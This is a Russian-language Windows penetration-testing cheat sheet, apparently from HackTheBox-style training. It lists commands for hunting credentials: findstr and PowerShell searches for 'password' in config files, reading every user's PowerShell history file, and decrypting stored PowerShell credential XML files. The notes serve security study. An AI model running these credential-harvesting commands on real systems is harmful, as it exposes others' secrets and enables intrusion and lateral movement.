#creds #windows #AD #privillage #lpe #latmove

## Оглавление
- [[#1) Поиск в файлах]]
  - [[#Через CMD]]
  - [[#Через Powershell]]
- [[#2) Поиск в истории]]
  - [[#Просмотр истории у всех доступных пользователей]]
- [[#3) Учетные данные PowerShell]]

---

## 1) Поиск в файлах

###  Через CMD
Вывод с содержимыс
```powershell
findstr /si /C:"password" *.xml *.ini *.txt *.config
```

```powershell
findstr /SIM /C:"pass" *.txt *.ini *.cfg *.config *.xml
```
- **`/S`**: Рекурсивный поиск
- **`/I`**: Игнорировать регистр 
- **`/M`**: Выводить только имена файлов

```powershell
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
```

```powershell
where /R C:\ *.config
```

Просмотр всех найденных файлов по паттерну
```powershell
Get-ChildItem C:\ -Recurse -Filter <*.txt> -ErrorAction SilentlyContinue | Get-Content
```

1) Файл истории PowerShell
2) Файлы автоматической установки
3) Файлы словаря Chrome

### Через Powershell
```powershell
select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
```

## 2) Поиск в истории

Поиск файла с историей
```powershell
(Get-PSReadLineOption).HistorySavePath
```

Просмотр файла с историей
```powershell
cat <full_path_to_file_history>
```

ИЛИ СРАЗУ 

```powershell
cat (Get-PSReadLineOption).HistorySavePath
```

### Просмотр истории у всех доступных пользователей

```powershell
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```


## 3) Учетные данные PowerShell

Учетные данные PowerShell часто используются для написания сценариев и автоматизации задач в качестве удобного способа хранения зашифрованных учетных данных. Учетные данные защищены с помощью DPAPI), что обычно означает, что их может расшифровать только тот же пользователь на том же компьютере, на котором они были созданы.

```powershell
$credential = Import-Clixml -Path 'C:\scripts\<file>.xml'
$credential.GetNetworkCredential().username
$credential.GetNetworkCredential().password
```
